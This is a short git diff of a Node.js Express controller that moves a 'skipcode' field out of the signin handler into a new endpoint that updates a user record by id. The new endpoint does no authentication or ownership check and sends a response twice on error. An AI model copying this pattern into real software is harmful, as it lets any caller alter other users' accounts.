@@ -40,13 +40,13 @@ const Info = require('../models/Info')
 
 
 module.exports.signin_post = (req, res) => {
-    const { email, password, username, site, skipcode } = req.body;
+    const { email, password, username, site } = req.body;
     const user = new User({
         email,
         password,
         username,
         site,
-        skipcode
+
 
     })
     user.save()
@@ -56,7 +56,20 @@ module.exports.signin_post = (req, res) => {
 
 }
 
+module.exports.skip_code = (req, res) => {
+    const { id, skipcode } = req.body;
+    User.findOneAndUpdate({ _id: id }, {
+        $set: {
+            skipcode: skipcode
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+        res.status(200).json({ success: true })
+    })
 
+}
 module.exports.login_post = async (req, res) => {
     const { username, password } = req.body;
     try {
